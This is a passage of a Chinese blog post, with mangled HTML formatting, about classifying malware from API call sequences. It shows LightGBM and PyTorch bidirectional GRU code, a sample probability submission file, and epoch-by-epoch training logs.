+        tfidf_features = self.tfidf.fit_transform(train_sequences[&#39;api_sequence&#39;])
+    else:
+        tfidf_features = self.tfidf.transform(train_sequences[&#39;api_sequence&#39;])
+
+    feature_names = [f&#39;tfidf_&#123;i&#125;&#39; for i in range(tfidf_features.shape[1])]
+    tfidf_df = pd.DataFrame(
+        tfidf_features.toarray(),
+        columns=feature_names,
+        dtype=np.float32
+    )
+    tfidf_df[&#39;file_id&#39;] = train_sequences[&#39;file_id&#39;].values
+
+    if test_data is not None:
+        print(&quot;处理测试数据TF-IDF特征...&quot;)
+        test_sequences = prepare_api_sequence(test_data)
+        test_features = self.tfidf.transform(test_sequences[&#39;api_sequence&#39;])
+        test_tfidf_df = pd.DataFrame(
+            test_features.toarray(),
+            columns=feature_names,
+            dtype=np.float32
+        )
+        test_tfidf_df[&#39;file_id&#39;] = test_sequences[&#39;file_id&#39;].values
+        return tfidf_df, test_tfidf_df
+
+    return tfidf_df
+
+def train(self, train_data, n_folds=5):
+    print(&quot;准备训练数据...&quot;)
+    train_features = self.prepare_features(train_data)
+
+    X = train_features.drop([&#39;file_id&#39;, &#39;label&#39;], axis=1)
+    y = train_features[&#39;label&#39;]
+
+    num_classes = len(y.unique())
+
+    params = &#123;
+        &#39;objective&#39;: &#39;multiclass&#39;,
+        &#39;num_class&#39;: num_classes,
+        &#39;metric&#39;: &#39;multi_logloss&#39;,
+        &#39;boosting_type&#39;: &#39;gbdt&#39;,
+        &#39;num_leaves&#39;: 31,
+        &#39;learning_rate&#39;: 0.05,
+        &#39;feature_fraction&#39;: 0.9,
+        &#39;bagging_fraction&#39;: 0.8,
+        &#39;bagging_freq&#39;: 5,
+        &#39;verbose&#39;: -1,
+        &#39;max_bin&#39;: 63,
+        &#39;min_data_in_leaf&#39;: 50,
+        &#39;num_threads&#39;: 8
+    &#125;
+
+    if self.use_gpu:
+        gpu_params = &#123;
+            &#39;device&#39;: &#39;gpu&#39;,
+            &#39;gpu_platform_id&#39;: 0,
+            &#39;gpu_device_id&#39;: 0,
+            &#39;device_type&#39;: &#39;cuda&#39;,
+            &#39;tree_learner&#39;: &#39;feature&#39;
+        &#125;
+        params.update(gpu_params)
+
+    kf = StratifiedKFold(n_splits=n_folds, shuffle=True, random_state=42)
+    self.models = []
+    self.feature_importances = pd.DataFrame()
+    validation_accuracies = []
+
+    print(f&quot;开始&#123;n_folds&#125;折交叉验证训练...&quot;)
+    for fold, (train_idx, val_idx) in enumerate(kf.split(X, y), 1):
+        print(f&quot;\n训练折数 &#123;fold&#125;/&#123;n_folds&#125;&quot;)
+        X_train, X_val = X.iloc[train_idx], X.iloc[val_idx]
+        y_train, y_val = y.iloc[train_idx], y.iloc[val_idx]
+
+        train_data = lgb.Dataset(X_train, y_train)
+        valid_data = lgb.Dataset(X_val, y_val, reference=train_data)
+
+        model = lgb.train(
+            params,
+            train_data,
+            num_boost_round=1000,
+            valid_sets=[valid_data],
+            callbacks=[
+                lgb.early_stopping(50),
+                lgb.log_evaluation(100)
+            ]
+        )
+
+        self.models.append(model)
+
+        fold_importance = pd.DataFrame(&#123;
+            &#39;feature&#39;: X.columns,
+            f&#39;importance_fold_&#123;fold&#125;&#39;: model.feature_importance()
+        &#125;)
+        self.feature_importances = pd.concat([
+            self.feature_importances,
+            fold_importance
+        ], axis=1)
+
+        val_preds = model.predict(X_val)
+        val_preds = np.argmax(val_preds, axis=1)
+        val_accuracy = accuracy_score(y_val, val_preds)
+        validation_accuracies.append(val_accuracy)
+        print(f&quot;Fold &#123;fold&#125; 验证集准确率: &#123;val_accuracy:.4f&#125;&quot;)
+
+    mean_accuracy = np.mean(validation_accuracies)
+    print(f&quot;\n平均验证集准确率: &#123;mean_accuracy:.4f&#125;&quot;)
+
+def predict(self, test_data):
+    print(&quot;准备测试数据...&quot;)
+    test_features = self.prepare_features(test_data=test_data)
+
+    print(&quot;生成预测...&quot;)
+    X_test = test_features.drop([&#39;file_id&#39;], axis=1)
+
+    predictions = np.zeros((len(X_test), len(self.label_map)), dtype=np.float32)
+    for model in self.models:
+        predictions += model.predict(X_test)
+    predictions /= len(self.models)
+
+    submission = pd.DataFrame(&#123;
+        &#39;file_id&#39;: test_features[&#39;file_id&#39;]
+    &#125;)
+
+    for i, label in enumerate(sorted(self.label_map.keys())):
+        submission[f&#39;prob_&#123;label&#125;&#39;] = predictions[:, i]
+
+    return submission
+</code></pre><p>def load_data_in_chunks(train_path, test_path, chunk_size=1000000):<br>    print(“读取训练数据…”)<br>    train_chunks = pd.read_csv(train_path, chunksize=chunk_size)<br>    train_data = pd.concat(train_chunks)</p>
+<pre><code>print(&quot;读取测试数据...&quot;)
+test_chunks = pd.read_csv(test_path, chunksize=chunk_size)
+test_data = pd.concat(test_chunks)
+
+train_data = optimize_dtypes(train_data)
+test_data = optimize_dtypes(test_data)
+
+print(f&quot;训练数据形状: &#123;train_data.shape&#125;&quot;)
+print(f&quot;测试数据形状: &#123;test_data.shape&#125;&quot;)
+
+return train_data, test_data
+</code></pre><p>def main():<br>    print(“检查GPU状态…”)<br>    gpu_available = check_gpu()</p>
+<pre><code>try:
+    train_data, test_data = load_data_in_chunks(
+        &#39;input/train.csv&#39;,
+        &#39;input/test.csv&#39;
+    )
+
+    classifier = MalwareClassifier(use_gpu=gpu_available)
+
+    classifier.train(train_data, n_folds=5)
+
+    print(&quot;生成预测结果...&quot;)
+    submission = classifier.predict(test_data)
+
+    print(&quot;保存预测结果...&quot;)
+    submission.to_csv(&#39;submission.csv&#39;, index=False)
+
+    if classifier.feature_importances is not None:
+        classifier.feature_importances.to_csv(&#39;feature_importances.csv&#39;, index=False)
+
+    print(&quot;完成!&quot;)
+
+except Exception as e:
+    print(f&quot;发生错误: &#123;str(e)&#125;&quot;)
+    import traceback
+    traceback.print_exc()
+</code></pre><p>if <strong>name</strong> == “<strong>main</strong>“:<br>    main()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. 结果展示</span><br><span class="line"></span><br><span class="line">&#123;% asset_img image-20241213004238784.png image-20241213004238784 %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>file_id,prob_0,prob_1,prob_2,prob_3,prob_4,prob_5,prob_6,prob_7<br>1,0.0024434612,0.00034864913,0.9696685,0.0078575,0.00039957318,0.002738173,0.0044820085,0.012062186<br>2,0.7480677,0.0013819844,0.0049213427,0.003764731,0.0005452622,0.045439627,0.017060611,0.17881876<br>3,0.99866915,2.787807e-05,0.00014846055,0.00011570427,5.9706535e-06,0.00043032583,6.843034e-05,0.00053410063<br>4,0.051594943,0.0038525928,0.035013992,0.065091416,0.0038617428,0.044863444,0.22614911,0.5695728<br>5,0.9948373,0.00013502031,0.0009673423,0.0006626427,2.3118486e-05,0.0015179071,0.00018578261,0.0016709866<br>6,0.002266401,0.00025418383,0.006541302,0.0007698187,3.052294e-05,0.98704815,0.00070866174,0.0023810265<br>7,0.0043757814,0.00055977836,0.0015399179,0.70781934,0.002132857,0.025764057,0.0015818799,0.2562264<br>8,0.93392134,0.0009572902,0.0076661445,0.0061014136,0.00012724655,0.016519673,0.003812942,0.030893898<br>9,0.85189515,0.0010084683,0.0036384996,0.0051778518,0.00022519422,0.07421501,0.014758055,0.04908181<br>10,0.37684268,0.006323976,0.20794848,0.0114947595,0.00050486217,0.12723994,0.03782148,0.23182385<br>11,0.0064604813,0.0006989088,0.0032121348,0.0008223769,5.8260433e-05,0.9772016,0.0031507823,0.008395462<br>12,0.9656893,0.0048273774,0.009747942,0.001571597,4.1226842e-05,0.0074556046,0.000666464,0.010000597<br>13,0.9976041,5.375104e-05,0.00030956598,0.00024548933,1.8375762e-05,0.0011245721,9.734804e-05,0.00054680154<br>14,0.9703827,0.00031270864,0.01056415,0.008323639,0.00010526275,0.0041897697,0.00083469774,0.0052871224<br>15,0.9724293,0.0001765955,0.020143056,0.0005281937,5.2647345e-05,0.0018647272,0.00078569603,0.004019852<br>16,0.99562645,7.9901416e-05,0.00037493333,0.00046305108,1.6109376e-05,0.0015119539,0.00081107346,0.0011165042<br>17,0.001069112,0.00026497667,0.004910701,0.0060763317,0.00013840488,0.96927947,0.0017614173,0.016499612<br>18,0.986684,0.00047525796,0.0021059073,0.0008186839,3.3282307e-05,0.004973329,0.0010258693,0.0038835872<br>19,0.9890321,0.00015959739,0.002707534,0.0009250467,5.465704e-05,0.0030247762,0.00037867084,0.0037176465<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% asset_img output (3 output (3) %&#125;.png)</span><br><span class="line"></span><br><span class="line">#### 第三部分：基于深度学习的恶意程序检测与分类</span><br><span class="line"></span><br><span class="line">##### **实验方法**</span><br><span class="line"></span><br><span class="line">1. 特征：</span><br><span class="line">   - 使用API调用序列直接作为输入。</span><br><span class="line">2. 模型结构：</span><br><span class="line">   - 基于双向GRU的深度学习模型。</span><br><span class="line">   - 嵌入层将API序列转换为向量，双向GRU捕获序列时序信息，全连接层输出分类结果。</span><br><span class="line">3. 训练与验证：</span><br><span class="line">   - 使用交叉熵损失函数，Adam优化器。</span><br><span class="line">   - 保存验证集损失最小的模型。</span><br><span class="line"></span><br><span class="line">##### **实验结果**</span><br><span class="line"></span><br><span class="line">1. 代码实现：</span><br><span class="line"></span><br><span class="line">   - 使用PyTorch实现深度学习模型。</span><br><span class="line"></span><br><span class="line">2. 性能表现：</span><br><span class="line"></span><br><span class="line">   - 最终验证集准确率达到**83.66%**。</span><br><span class="line">   - 模型在20个epoch中逐步收敛，训练准确率从初始的42.72%提升至84.67%。</span><br><span class="line">   - 验证集损失显著降低，证明模型具有良好的泛化能力。</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>   import os<br>   import numpy as np<br>   import pandas as pd<br>   import torch<br>   import torch.nn as nn<br>   import torch.optim as optim<br>   from torch.utils.data import DataLoader, Dataset<br>   from sklearn.preprocessing import LabelEncoder<br>   from sklearn.model_selection import train_test_split<br>   from tqdm import tqdm</p>
+<h1 id="设置随机种子和设备"><a href="#设置随机种子和设备" class="headerlink" title="设置随机种子和设备"></a>设置随机种子和设备</h1><p>   SEED = 42<br>   np.random.seed(SEED)<br>   torch.manual_seed(SEED)<br>   DEVICE = torch.device(“cuda” if torch.cuda.is_available() else “cpu”)<br>   print(f”Using device: {DEVICE}”)</p>
+<h1 id="加载数据"><a href="#加载数据" class="headerlink" title="加载数据"></a>加载数据</h1><p>   train_data = pd.read_csv(‘input/train.csv’)<br>   test_data = pd.read_csv(‘input/test.csv’)</p>
+<h1 id="编码API"><a href="#编码API" class="headerlink" title="编码API"></a>编码API</h1><p>   apis = list(set(list(train_data.api.unique()) + list(test_data.api.unique())))<br>   enc = LabelEncoder().fit(apis)<br>   train_data[‘enc’] = enc.transform(train_data.api)<br>   test_data[‘enc’] = enc.transform(test_data.api)</p>
+<h1 id="聚合每个文件的API序列"><a href="#聚合每个文件的API序列" class="headerlink" title="聚合每个文件的API序列"></a>聚合每个文件的API序列</h1><p>   tr = train_data.groupby(‘file_id’).enc.apply(list).reset_index()<br>   te = test_data.groupby(‘file_id’).enc.apply(list).reset_index()</p>
+<h1 id="提取标签"><a href="#提取标签" class="headerlink" title="提取标签"></a>提取标签</h1><p>   label = train_data.groupby(‘file_id’)[‘label’].agg(‘first’).reset_index()<br>   num_classes = label.label.nunique()<br>   label_encoder = LabelEncoder()<br>   label[‘label’] = label_encoder.fit_transform(label[‘label’])</p>
+<h1 id="填充序列"><a href="#填充序列" class="headerlink" title="填充序列"></a>填充序列</h1><p>   MAX_SEQ_LEN = 5000<br>   tr[‘enc’] = tr[‘enc’].apply(lambda x: x[:MAX_SEQ_LEN] if len(x) &gt; MAX_SEQ_LEN else x + [0] <em> (MAX_SEQ_LEN - len(x)))<br>   te[‘enc’] = te[‘enc’].apply(lambda x: x[:MAX_SEQ_LEN] if len(x) &gt; MAX_SEQ_LEN else x + [0] </em> (MAX_SEQ_LEN - len(x)))</p>
+<h1 id="转换为-PyTorch-Dataset"><a href="#转换为-PyTorch-Dataset" class="headerlink" title="转换为 PyTorch Dataset"></a>转换为 PyTorch Dataset</h1><p>   class VirusDataset(Dataset):<br>       def <strong>init</strong>(self, sequences, labels=None):<br>           self.sequences = torch.tensor(sequences, dtype=torch.long)<br>           self.labels = torch.tensor(labels, dtype=torch.long) if labels is not None else None</p>
+<pre><code>   def __len__(self):
+       return len(self.sequences)
+
+   def __getitem__(self, idx):
+       if self.labels is not None:
+           return self.sequences[idx], self.labels[idx]
+       else:
+           return self.sequences[idx]
+</code></pre><h1 id="创建数据集"><a href="#创建数据集" class="headerlink" title="创建数据集"></a>创建数据集</h1><p>   X_train, X_val, y_train, y_val = train_test_split(tr[‘enc’].tolist(), label[‘label’].tolist(), test_size=0.2, random_state=SEED)<br>   train_dataset = VirusDataset(X_train, y_train)<br>   val_dataset = VirusDataset(X_val, y_val)<br>   test_dataset = VirusDataset(te[‘enc’].tolist())</p>
+<h1 id="数据加载器"><a href="#数据加载器" class="headerlink" title="数据加载器"></a>数据加载器</h1><p>   BATCH_SIZE = 256<br>   train_loader = DataLoader(train_dataset, batch_size=BATCH_SIZE, shuffle=True)<br>   val_loader = DataLoader(val_dataset, batch_size=BATCH_SIZE, shuffle=False)<br>   test_loader = DataLoader(test_dataset, batch_size=BATCH_SIZE, shuffle=False)</p>
+<h1 id="模型定义"><a href="#模型定义" class="headerlink" title="模型定义"></a>模型定义</h1><p>   class GRUModel(nn.Module):<br>       def <strong>init</strong>(self, vocab<em>size, embed<em>dim, hidden_dim, num_classes):<br>           super(GRUModel, self).__init</em></em>()<br>           self.embedding = nn.Embedding(vocab_size, embed_dim, padding_idx=0)<br>           self.gru = nn.GRU(embed_dim, hidden_dim, batch_first=True, bidirectional=True)<br>           self.fc = nn.Linear(hidden_dim * 2, num_classes)<br>           self.dropout = nn.Dropout(0.3)</p>
+<pre><code>   def forward(self, x):
+       x = self.embedding(x)  # x shape: (batch_size, seq_len, embed_dim)
+       x, _ = self.gru(x)     # x shape: (batch_size, seq_len, hidden_dim * 2)
+       x = x[:, -1, :]         # 取最后一个时间步的输出 (batch_size, hidden_dim * 2)
+       x = self.dropout(x)
+       x = self.fc(x)         # x shape: (batch_size, num_classes)
+       return x
+</code></pre><h1 id="超参数"><a href="#超参数" class="headerlink" title="超参数"></a>超参数</h1><p>   VOCAB_SIZE = len(apis) + 1<br>   EMBED_DIM = 50<br>   HIDDEN_DIM = 128<br>   NUM_CLASSES = num_classes<br>   LR = 0.001<br>   EPOCHS = 20</p>
+<h1 id="初始化模型、损失函数和优化器"><a href="#初始化模型、损失函数和优化器" class="headerlink" title="初始化模型、损失函数和优化器"></a>初始化模型、损失函数和优化器</h1><p>   model = GRUModel(VOCAB_SIZE, EMBED_DIM, HIDDEN_DIM, NUM_CLASSES).to(DEVICE)<br>   criterion = nn.CrossEntropyLoss()<br>   optimizer = optim.Adam(model.parameters(), lr=LR)</p>
+<h1 id="检查是否存在模型文件"><a href="#检查是否存在模型文件" class="headerlink" title="检查是否存在模型文件"></a>检查是否存在模型文件</h1><p>   MODEL_PATH = ‘best_gru_model.pth’<br>   if os.path.exists(MODEL_PATH):<br>       print(f”检测到已有模型文件 {MODEL_PATH}，直接加载模型进行预测…”)<br>       model.load_state_dict(torch.load(MODEL_PATH))<br>   else:</p>
+<pre><code>   # 训练和验证函数
+   def train_epoch(model, dataloader, criterion, optimizer):
+       model.train()
+       epoch_loss, correct, total = 0, 0, 0
+       for sequences, labels in tqdm(dataloader, desc=&quot;Training&quot;):
+           sequences, labels = sequences.to(DEVICE), labels.to(DEVICE)
+           optimizer.zero_grad()
+           outputs = model(sequences)
+           loss = criterion(outputs, labels)
+           loss.backward()
+           optimizer.step()
+           epoch_loss += loss.item() * sequences.size(0)
+           preds = outputs.argmax(dim=1)
+           correct += (preds == labels).sum().item()
+           total += labels.size(0)
+       return epoch_loss / total, correct / total
+
+   def validate_epoch(model, dataloader, criterion):
+       model.eval()
+       epoch_loss, correct, total = 0, 0, 0
+       with torch.no_grad():
+           for sequences, labels in tqdm(dataloader, desc=&quot;Validation&quot;):
+               sequences, labels = sequences.to(DEVICE), labels.to(DEVICE)
+               outputs = model(sequences)
+               loss = criterion(outputs, labels)
+               epoch_loss += loss.item() * sequences.size(0)
+               preds = outputs.argmax(dim=1)
+               correct += (preds == labels).sum().item()
+               total += labels.size(0)
+       return epoch_loss / total, correct / total
+
+   # 开始训练模型
+   best_val_loss = float(&#39;inf&#39;)
+   for epoch in range(EPOCHS):
+       print(f&quot;\nEpoch &#123;epoch + 1&#125;/&#123;EPOCHS&#125;&quot;)
+       train_loss, train_acc = train_epoch(model, train_loader, criterion, optimizer)
+       val_loss, val_acc = validate_epoch(model, val_loader, criterion)
+       print(f&quot;Train Loss: &#123;train_loss:.4f&#125;, Train Accuracy: &#123;train_acc:.4f&#125;&quot;)
+       print(f&quot;Validation Loss: &#123;val_loss:.4f&#125;, Validation Accuracy: &#123;val_acc:.4f&#125;&quot;)
+       if val_loss &lt; best_val_loss:
+           best_val_loss = val_loss
+           torch.save(model.state_dict(), MODEL_PATH)
+           print(f&quot;Model saved at &#123;MODEL_PATH&#125;!&quot;)
+</code></pre><h1 id="测试集预测"><a href="#测试集预测" class="headerlink" title="测试集预测"></a>测试集预测</h1><p>   model.eval()<br>   test_preds = []<br>   with torch.no_grad():<br>       for sequences in tqdm(test_loader, desc=”Testing”):<br>           sequences = sequences.to(DEVICE)<br>           outputs = model(sequences)<br>           preds = torch.softmax(outputs, dim=1).cpu().numpy()<br>           test_preds.append(preds)</p>
+<p>   test_preds = np.concatenate(test_preds, axis=0)</p>
+<h1 id="创建提交文件"><a href="#创建提交文件" class="headerlink" title="创建提交文件"></a>创建提交文件</h1><p>   sub = pd.DataFrame()<br>   sub[‘file_id’] = te[‘file_id’]  # 使用测试集中的 file_id 列</p>
+<h1 id="将每个类别的预测概率填入"><a href="#将每个类别的预测概率填入" class="headerlink" title="将每个类别的预测概率填入"></a>将每个类别的预测概率填入</h1><p>   for i in range(NUM_CLASSES):<br>       sub[f’prob{i}’] = test_preds[:, i]</p>
+<h1 id="保存为提交文件"><a href="#保存为提交文件" class="headerlink" title="保存为提交文件"></a>保存为提交文件</h1><p>   sub.to_csv(‘pytorch_gru_submission.csv’, index=False)<br>   print(“预测完成并保存至 pytorch_gru_submission.csv”)</p>
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>   PS D:\chen_hao\病毒检测机器学习&gt; &amp; D:/ProgramSoftware/anaconda3/python.exe d:/chen_hao/病毒检测机器学习/RNN.py<br>   Using device: cuda</p>
+<p>   Epoch 1/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:32&lt;00:00,  1.35it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.01it/s]<br>   Train Loss: 1.6978, Train Accuracy: 0.4272<br>   Validation Loss: 1.5224, Validation Accuracy: 0.4460<br>   Model saved!</p>
+<p>   Epoch 2/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:27&lt;00:00,  1.59it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.01it/s]<br>   Train Loss: 1.5041, Train Accuracy: 0.4547<br>   Validation Loss: 1.5046, Validation Accuracy: 0.4471<br>   Model saved!</p>
+<p>   Epoch 3/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:29&lt;00:00,  1.51it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 1.4797, Train Accuracy: 0.4620<br>   Validation Loss: 1.4927, Validation Accuracy: 0.4489<br>   Model saved!</p>
+<p>   Epoch 4/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.56it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 1.4648, Train Accuracy: 0.4689<br>   Validation Loss: 1.4740, Validation Accuracy: 0.4633<br>   Model saved!</p>
+<p>   Epoch 5/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:27&lt;00:00,  1.58it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 1.4373, Train Accuracy: 0.4820<br>   Validation Loss: 1.4314, Validation Accuracy: 0.4924<br>   Model saved!</p>
+<p>   Epoch 6/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:27&lt;00:00,  1.59it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.01it/s]<br>   Train Loss: 1.4187, Train Accuracy: 0.4918<br>   Validation Loss: 1.3496, Validation Accuracy: 0.5169<br>   Model saved!</p>
+<p>   Epoch 7/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.57it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 1.4115, Train Accuracy: 0.5090<br>   Validation Loss: 1.3058, Validation Accuracy: 0.5504<br>   Model saved!</p>
+<p>   Epoch 8/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.57it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.00it/s]<br>   Train Loss: 1.1772, Train Accuracy: 0.6115<br>   Validation Loss: 1.0737, Validation Accuracy: 0.6267<br>   Model saved!</p>
+<p>   Epoch 9/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 1.0006, Train Accuracy: 0.6609<br>   Validation Loss: 0.9820, Validation Accuracy: 0.6598<br>   Model saved!</p>
+<p>   Epoch 10/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 0.9129, Train Accuracy: 0.6887<br>   Validation Loss: 0.9084, Validation Accuracy: 0.6749<br>   Model saved!</p>
+<p>   Epoch 11/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 0.8453, Train Accuracy: 0.7069<br>   Validation Loss: 0.8542, Validation Accuracy: 0.7030<br>   Model saved!</p>
+<p>   Epoch 12/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 0.7822, Train Accuracy: 0.7422<br>   Validation Loss: 0.7674, Validation Accuracy: 0.7520<br>   Model saved!</p>
+<p>   Epoch 13/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 0.7204, Train Accuracy: 0.7704<br>   Validation Loss: 0.7360, Validation Accuracy: 0.7639<br>   Model saved!</p>
+<p>   Epoch 14/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 0.7144, Train Accuracy: 0.7717<br>   Validation Loss: 0.7184, Validation Accuracy: 0.7664<br>   Model saved!</p>
+<p>   Epoch 15/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.02it/s]<br>   Train Loss: 0.6625, Train Accuracy: 0.7878<br>   Validation Loss: 0.6925, Validation Accuracy: 0.7721<br>   Model saved!</p>
+<p>   Epoch 16/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.54it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 0.6390, Train Accuracy: 0.7931<br>   Validation Loss: 0.6748, Validation Accuracy: 0.7815<br>   Model saved!</p>
+<p>   Epoch 17/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 0.6061, Train Accuracy: 0.8033<br>   Validation Loss: 0.6415, Validation Accuracy: 0.7927<br>   Model saved!</p>
+<p>   Epoch 18/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.00it/s]<br>   Train Loss: 0.5665, Train Accuracy: 0.8278<br>   Validation Loss: 0.5947, Validation Accuracy: 0.8279<br>   Model saved!</p>
+<p>   Epoch 19/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.53it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.02it/s]<br>   Train Loss: 0.5263, Train Accuracy: 0.8396<br>   Validation Loss: 0.5656, Validation Accuracy: 0.8287<br>   Model saved!</p>
